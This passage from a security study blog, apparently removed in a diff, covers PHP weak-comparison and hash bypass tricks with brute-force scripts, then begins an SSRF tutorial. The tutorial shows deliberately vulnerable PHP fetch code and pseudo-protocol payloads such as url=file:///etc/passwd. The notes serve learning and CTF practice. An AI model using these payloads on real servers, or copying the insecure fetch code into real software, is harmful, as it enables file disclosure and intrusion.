class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1</span><br><span class="line">b=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h1 id="实验8"><a href="#实验8" class="headerlink" title="实验8"></a>实验8</h1><p><img src="/.com//image-20250417175035-pl0a3iz.png" alt="image"></p>
-<p><img src="/.com//image-20250417175038-xd91avl.png" alt="image"></p>
-<p>两个SHA1值相同而SHA256的值不同的pdf文件, <a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a>和<a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p>
-<p>‍</p>
-<h1 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a==md5($a)"></a>$a==md5($a)</h1><p>​<code>0e215962017</code>​的 <code>MD5</code>​ 值也是由 <code>0e</code>​ 开头，在 PHP 弱类型比较中等</p>
-<p>‍</p>
-<h1 id="实验9"><a href="#实验9" class="headerlink" title="实验9"></a>实验9</h1><p><img src="/.com//image-20250417175101-50g9dml.png" alt="image"></p>
-<p><img src="/.com//image-20250417175105-z4p4lmw.png" alt="image"></p>
-<p>‍</p>
-<h1 id="NAN-和-INF"><a href="#NAN-和-INF" class="headerlink" title="NAN 和 INF"></a>NAN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是通过<code>var_dump</code>​查看数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串<code>NAN</code>​和字符串<code>INF</code>​使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN=NAN</code>​都是false，但<code>md5(&#39;NaN&#39;)==md5(&#39;NAN&#39;)</code>​为true。</p>
-<p>‍</p>
-<h1 id="实验10"><a href="#实验10" class="headerlink" title="实验10"></a>实验10</h1><p><img src="/.com//image-20250417175117-ndyibgq.png" alt="image"></p>
-<p><img src="/.com//image-20250417175121-hgvnlqn.png" alt="image"></p>
-<p><img src="/.com//image-20250417175124-dql4g5j.png" alt="image"></p>
-<p><img src="/.com//image-20250417175127-ivcykbh.png" alt="image"></p>
-<p>可以使用<code>NAN</code>​绕过<code>md5()</code>​和<code>sha1()</code>​</p>
-<p>‍</p>
-<h1 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h2 id="MD5截断爆破"><a href="#MD5截断爆破" class="headerlink" title="MD5截断爆破"></a>MD5截断爆破</h2><p>给出一段<code>md5</code>​值要求找到匹配的原码。一般使用爆破脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">md5</span>(ant):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">str</span>(ant).<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;8ffb1&#x27;</span>  <span class="comment"># 已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">findmd5</span>(sss):  <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="keyword">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="keyword">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">md5</span>(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&#x27;&#123;result&#125; &#123;md5(result)&#125;&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="keyword">list</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line">pool = <span class="title function_ invoke__">ThreadPool</span>()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="title function_ invoke__">map</span>(findmd5, <span class="keyword">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.<span class="title function_ invoke__">close</span>()</span><br><span class="line">pool.<span class="title function_ invoke__">join</span>()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417175151-7xw4wjg.png" alt="image"></p>
-<p>‍</p>
-<h2 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h2><p>脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sha256截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):  <span class="comment"># 计算sha256字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="string">f&#x27;TQLCTF<span class="subst">&#123;s&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysha256 = <span class="string">&#x27;5625f&#x27;</span>  <span class="comment"># 已知的sha256截断值</span></span><br><span class="line">sha256start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">sha256length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findsha256</span>(<span class="params">sss</span>):  <span class="comment"># 输入范围 里面会进行sha256测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(sha256(i)[sha256start:sha256length])</span></span><br><span class="line">        <span class="keyword">if</span> sha256(i)[<span class="number">0</span>:<span class="number">5</span>] == keysha256:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;result&#125;</span> <span class="subst">&#123;sha256(result)&#125;</span>&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findsha256, <span class="built_in">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417175213-75wbvwu.png" alt="image"></p>
-<p>‍</p>
-<h1 id="array-search和is-array"><a href="#array-search和is-array" class="headerlink" title="array_search和is_array"></a>array_search和is_array</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (!is_array($_GET[<span class="string">&#x27;test&#x27;</span>])) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$test = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($test); $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($test[$i] === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        echo <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i] = intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (array_search(<span class="string">&quot;admin&quot;</span>, $test) === <span class="number">0</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417175225-hxln96p.png" alt="image"></p>
-<p><img src="/.com//image-20250417175228-20igd3y.png" alt="image"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmawck7hl0005rk7k52h7d29j" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/SSRF/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
-<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
-<hr>
-<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
-<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
-<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
-<hr>
-<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
-<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
-<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
-<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
-<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
-<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
-</blockquote>
-<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
-<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
-<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
-<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
-<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
-<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
-<blockquote>
-<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
-</blockquote>
-<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
-<hr>
-<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
-<p><strong>1、file_get_contents:</strong></p>
-<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2、sockopen():</strong></p>
-<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>3、curl_exec():</strong></p>
-<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意事项</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
-
-<p><strong>1、file</strong></p>
-<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
-<blockquote>
-<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
-</blockquote>
-<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
-<p><strong>2、dict</strong></p>
-<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<blockquote>
